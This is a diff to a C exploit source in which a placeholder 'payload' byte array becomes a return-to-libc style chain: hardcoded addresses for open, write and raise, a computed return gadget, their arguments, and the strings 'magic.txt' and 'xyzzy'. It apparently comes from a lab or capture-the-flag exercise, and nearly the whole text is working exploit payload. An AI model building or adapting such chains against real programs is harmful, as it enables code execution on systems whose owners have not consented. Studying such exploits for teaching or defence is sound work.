@@ -23,18 +23,20 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* FIXME */
 	/* ------------------------------------	*/
-	"\x90\x90\x90\x90" //<open>
-	"\x90\x90\x90\x90"  //<return>
-	"\x2c\xc3\xff\xbf"; //<first param>
-						//<second param>
-						//<third param>
-						//<write>
-						//<return>
-						//<first param>
-						//<second param>
-						//<third param>
-						//<raise>
-						//<first param>
+	"\xf0\xea\xec\xb3" 					//<open> 0xb3eceaf0
+	"\x5d\x89\xe1\xb3"  				//<return> 0001e86d +  0xb3dfa0f0 = 0xB3E1895D
+	"\x2c\xc3\xff\xbf" 					//<first param> *fix
+	"\x01\x00\x00\x00"					//<second param>
+	"\x00\x00\x00\x00"					//<third param>
+	"\x10\xf0\xec\xb3" 					//<write> 0xb3ecf010
+	"\x5d\x89\xe1\xb3"					//<return>  0001e86d +  0xb3dfa0f0 = 0xB3E1895D
+	"\x03\x00\x00\x00"					//<first param> 
+	"\x90\x90\x90\x90"					//<second param> *fix
+	"\x06\x00\x00\x00"					//<third param>
+	"\x40\x1d\xe1\xb3"					//<raise> 0xb3e11d40
+	"\x0c\x00\x00\x00"					//<first param>
+	"magic.txt\0"
+	"xyzzy\0";						
 
 
 	/* ------------------------------------	*/
